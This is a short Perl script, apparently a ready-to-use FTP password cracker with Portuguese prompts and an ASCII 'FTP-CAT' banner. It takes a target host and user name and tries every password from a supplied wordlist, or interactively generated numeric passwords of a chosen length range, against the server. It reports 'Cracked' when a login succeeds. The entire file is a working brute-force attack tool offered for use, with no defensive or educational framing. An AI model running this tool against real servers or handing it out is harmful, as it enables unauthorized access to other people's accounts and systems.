#!/usr/bin/perl
use warnings;
use strict;
use Term::ANSIColor;
use Net::FTP;
use Config;

### ARGV[0] = HOST | ARGV[1] = USER | ARGV[2] (OPCIONAL) = WORDLIST

sub clear{
  if($Config{osname} =~ /win/i){
    system("cls");
  }else{
    system("clear");
  }
}

_ftp();

my ($host,$wordlist) = undef;
my $user = "anonymous";

$host = $ARGV[0] or die "-host www.example.com--";
$user = $ARGV[1] or warn "[*] Usuario padrao: anonymous" and sleep 3 and clear();
unless(! defined($ARGV[2])){
  $wordlist = $ARGV[2];
}

clear();

print color("BLUE");
sub _ftp{
print <<HERE;
\n\t######## ######## ########           ######     ###    ######## 
\t##          ##    ##     ##         ##    ##   ## ##      ##    
\t##          ##    ##     ##         ##        ##   ##     ##    
\t######      ##    ########  ####### ##       ##     ##    ##    
\t##          ##    ##                ##       #########    ##    
\t##          ##    ##                ##    ## ##     ##    ##    
\t##          ##    ##                 ######  ##     ##    ##
\n\n
HERE
}
print color("reset");
if(defined($host) && defined($user)){
  if(defined($wordlist)){
    open(WORDLIST, "<", "$wordlist");
	while(<WORDLIST>){
	  my $ftp = Net::FTP->new("$host", Debug => 0);
	  print "[*] Testing: $_\n";
	  $ftp->login("$user", "$_") or print "[*] Incorrect: $_\n" and next;
	  print "[*] Cracked: $_\n";
	  last;
	}
	close(WORDLIST);
  }else{
    print color("YELLOW"),"[!] Nenhuma wordlist escolhida, metodos em tempo-real:\n\n",color("reset");
    print "[*] 1 - [0-9]\n";
	print "\nBruteForce: ";
	chomp(my $choose = <STDIN>);
	if($choose == 1){
	  print "\n[*] Minimo: ";
	  chomp(my $min = <STDIN>);
	  print "\n[*] Maximo: ";
	  chomp(my $max = <STDIN>);
	  for(my $num = 0 x $min; length($num) <= $max; $num++){
	    print "[*] Testing: $num\n";
		my $ftp = Net::FTP->new("$host", Debug => 0);
		$ftp->login($user, $num) or next;
		print "\n[*] Cracked: $num\n";
		last;
	  }
	}
  }
}